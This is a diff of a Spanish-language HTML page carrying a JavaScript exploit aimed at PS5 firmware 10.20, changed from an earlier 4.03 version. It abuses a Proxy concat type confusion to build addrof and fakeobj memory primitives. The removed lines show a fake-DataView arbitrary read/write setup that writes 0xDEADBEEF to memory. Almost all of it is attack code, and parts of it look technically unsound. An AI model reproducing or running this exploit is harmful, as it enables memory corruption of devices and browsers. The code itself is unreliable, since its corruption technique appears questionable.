@@ -2,50 +2,73 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Exploit PS5 4.03 - AAR/AAW</title>
+  <title>Exploit PS5 10.20 - Type Confusion + Primitivas</title>
   <style>
     body { background:#111; color:#0f0; font-family:monospace; padding:2em; }
-    h1 { color: cyan; }
+    h1 { color: yellow; }
   </style>
 </head>
 <body>
-  <h1>PS5 4.03 - Primitivas AAR / AAW</h1>
-  <div id="output">Inicializando...</div>
+  <h1>Prueba Type Confusion + addrof / fakeobj (PS5 10.20)</h1>
+  <div id="output">Ejecutando...</div>
 
   <script>
     const f64 = new Float64Array(1);
     const u64 = new BigUint64Array(f64.buffer);
+    const u32 = new Uint32Array(f64.buffer);
 
-    function f2i(f) { f64[0] = f; return u64[0]; }
-    function i2f(i) { u64[0] = i; return f64[0]; }
-    function hex(i) { return "0x" + i.toString(16).padStart(16, "0"); }
+    function f2i(f) {
+      f64[0] = f;
+      return u64[0];
+    }
 
-    let leak_arr = [1.1];
-    let victim = { marker: 13.37 };
-    let master;
-    
+    function i2f(i) {
+      u64[0] = i;
+      return f64[0];
+    }
+
+    function hex(i) {
+      return "0x" + i.toString(16).padStart(16, "0");
+    }
+
+    let victim = [1.1, 2.2, 3.3];
+    let obj = { marker: 13.37 };
+    let container = { obj: obj };
+
+    let leak_arr, fake_arr, master;
+
     const handler = {
       get: function(target, prop) {
         if (prop === Symbol.isConcatSpreadable) {
-          leak_arr[0] = victim;
+          leak_arr[0] = obj;
           return true;
         }
         return target[prop];
       }
     };
 
+    leak_arr = [1.1];
     const proxy = new Proxy([], handler);
     const result = proxy.concat(leak_arr);
 
-    for (let i = 0; i < result.length; i++) {
-      if (result[i] === victim) {
-        master = result;
-        break;
+    function setup() {
+      for (let i = 0; i < result.length; i++) {
+        if (result[i] === obj) {
+          master = result;
+          break;
+        }
       }
+
+      if (!master) {
+        document.getElementById("output").textContent = "❌ No se logró corrupción";
+        return false;
+      }
+
+      return true;
     }
 
-    function addrof(obj) {
-      leak_arr[0] = obj;
+    function addrof(target) {
+      leak_arr[0] = target;
       return f2i(master[0]);
     }
 
@@ -54,57 +77,17 @@
       return leak_arr[0];
     }
 
-    function setup_rw() {
-      let ab = new ArrayBuffer(0x100);
-      let ab_addr = addrof(ab);
-      let dv = new DataView(ab);
-      let dv_addr = addrof(dv);
-
-      let fake = [
-        i2f(0),                 // fake JSCell
-        i2f(0x0108200700000000n), // butterfly (can be 0)
-        i2f(ab_addr),           // backing buffer
-        i2f(0), i2f(0), i2f(0), i2f(0)
-      ];
-
-      let fake_addr = addrof(fake) + 0x20n;
-      let corrupted = fakeobj(fake_addr);
-
-      return {
-        read64: function(addr) {
-          fake[2] = i2f(addr);
-          return f2i(corrupted.getFloat64(0, true));
-        },
-        write64: function(addr, val) {
-          fake[2] = i2f(addr);
-          corrupted.setFloat64(0, i2f(val), true);
-        }
-      };
-    }
-
-    try {
-      console.log("Iniciando primitivas...");
-      let { read64, write64 } = setup_rw();
-      console.log("Primitivas configuradas correctamente.");
-
-      let obj = { test: 1337 };
-      let addr = addrof(obj);
-
-      let val = read64(addr);
-      console.log("Dirección del objeto:", hex(addr));
-      console.log("Valor leído:", hex(val));
+    if (setup()) {
+      const addr = addrof({ hola: "PS5" });
+      const fake = fakeobj(addr);
 
       document.getElementById("output").innerHTML =
-        "✅ Lectura OK<br>📍 Dirección de objeto: " + hex(addr) +
-        "<br>📖 Valor leído: " + hex(val);
+        "✅ Primitivas listas<br>" +
+        "📍 Dirección de objeto: " + hex(addr) + "<br>" +
+        "🔁 fakeobj apunta a: " + JSON.stringify(fake);
 
-      // Prueba de escritura
-      let newVal = 0xDEADBEEF;
-      write64(addr, newVal);
-      console.log("Nuevo valor escrito:", hex(newVal));
-    } catch (e) {
-      document.getElementById("output").textContent = "❌ Error: " + e;
-      console.error("Error en la ejecución:", e);
+      console.log("[+] addrof:", hex(addr));
+      console.log("[+] fakeobj:", fake);
     }
   </script>
 </body>
